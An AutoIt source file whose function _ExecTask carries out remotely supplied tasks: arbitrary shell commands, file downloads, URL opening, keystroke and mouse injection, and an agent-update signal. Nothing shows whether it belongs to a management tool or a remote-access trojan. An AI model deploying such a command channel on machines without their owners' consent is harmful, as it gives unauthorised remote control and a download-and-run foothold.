#include-once
#include "agent_util.au3"

Func _ExecTask($type, $argsJson)
    Switch StringUpper($type)
        Case "OPEN_URL"
            Local $url = _JsonGetStr($argsJson, "url")
            If $url = "" Then Return SetError(1,0,"missing url")
            ShellExecute($url)
            Return "opened " & $url

        Case "SHELL"
            Local $cmd = _JsonGetStr($argsJson, "cmd")
            If $cmd = "" Then Return SetError(1,0,"missing cmd")
            Return _RunCmdCapture($cmd)

        Case "SLEEP"
            Local $ms = _JsonGetNum($argsJson, "ms")
            If $ms <= 0 Then $ms = 1000
            Sleep($ms)
            Return "slept " & $ms & " ms"

        Case "DOWNLOAD_FILE"
            Local $url = _JsonGetStr($argsJson, "url")
            Local $dst = _JsonGetStr($argsJson, "path")
            If $url = "" Or $dst = "" Then Return SetError(1,0,"missing url/path")
            InetGet($url, $dst, 1, 0)
            If @error Then Return SetError(1,0,"download failed")
            Return "downloaded -> " & $dst

        Case "TYPE_TEXT"
            Local $txt = _JsonGetStr($argsJson, "text")
            If $txt = "" Then Return SetError(1,0,"missing text")
            Send($txt)
            Return "typed"

        Case "KEYSEQ"
            Local $keys = _JsonGetStr($argsJson, "keys")
            If $keys = "" Then Return SetError(1,0,"missing keys")
            Send($keys)
            Return "keys sent"

        Case "CLICK"
            Local $x = _JsonGetNum($argsJson, "x")
            Local $y = _JsonGetNum($argsJson, "y")
            Local $btn = _JsonGetStr($argsJson, "button")
            If $btn = "" Then $btn = "left"
            Local $times = _JsonGetNum($argsJson, "times")
            If $times <= 0 Then $times = 1
            MouseClick($btn, $x, $y, $times, 0)
            Return "clicked " & $x & "," & $y

        Case "CONTROL_CLICK"
            Local $title = _JsonGetStr($argsJson, "title")
            Local $ctrl  = _JsonGetStr($argsJson, "control")
            If $title = "" Or $ctrl = "" Then Return SetError(1,0,"missing title/control")
            Local $ok = ControlClick($title, "", $ctrl)
            If $ok = 0 Then Return SetError(1,0,"control click failed")
            Return "control clicked"

        Case "UPDATE_AGENT"
            Return "update signaled" ; actual update done by updater module

        Case Else
            Return SetError(1,0,"unknown type: " & $type)
    EndSwitch
EndFunc
